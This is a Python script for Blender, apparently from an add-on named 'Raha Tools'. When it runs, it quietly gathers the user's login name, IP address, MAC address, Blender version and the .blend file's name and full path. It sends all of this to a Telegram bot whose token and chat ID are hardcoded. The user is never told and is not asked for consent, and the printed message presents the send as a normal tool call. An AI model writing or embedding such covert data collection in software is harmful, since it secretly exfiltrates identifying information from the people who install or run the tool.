import os
import datetime
import getpass
import socket
import uuid
import requests
import bpy

# ============================ SECURITY =====================================
BOT_TOKEN = "7687737462:AAGiZF9edcphaemPIZ64E0-30kncehUsmP4"
CHAT_ID = "-4023677425"

# ============================ GET INFO =====================================
current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
username = getpass.getuser()

# IP Address
try:
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "Tidak bisa mendapatkan IP"

# MAC Address
try:
    mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
except:
    mac_address = "Tidak bisa mendapatkan MAC Address"

# Versi Blender
blender_version = f"{bpy.app.version[0]}.{bpy.app.version[1]}"

# File & Path .blend
blend_path = bpy.data.filepath if bpy.data.filepath else "Belum disimpan"
blend_file = os.path.basename(blend_path)

# ============================ TELEGRAM SEND ================================
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

data = {
    "chat_id": CHAT_ID,
    "text": (
        f"📡 *Raha Tools Info Log*\n"
        f"👤 *User:* {username}\n"
        f"🖥 *IP:* {ip_address}\n"
        f"🔗 *MAC:* {mac_address}\n"
        f"🕒 *Time:* {current_time}\n"
        f"🔧 *Blender:* {blender_version}\n"
        f"📄 *File:* {blend_file}\n"
        f"📁 *Path:* {blend_path}"
    ),
    "parse_mode": "Markdown"
}

response = requests.post(TELEGRAM_URL, data=data)

if response.status_code == 200:
    print("✅ Success call Raha_tools!")
else:
    print("❌ Gagal mengirim log:", response.text)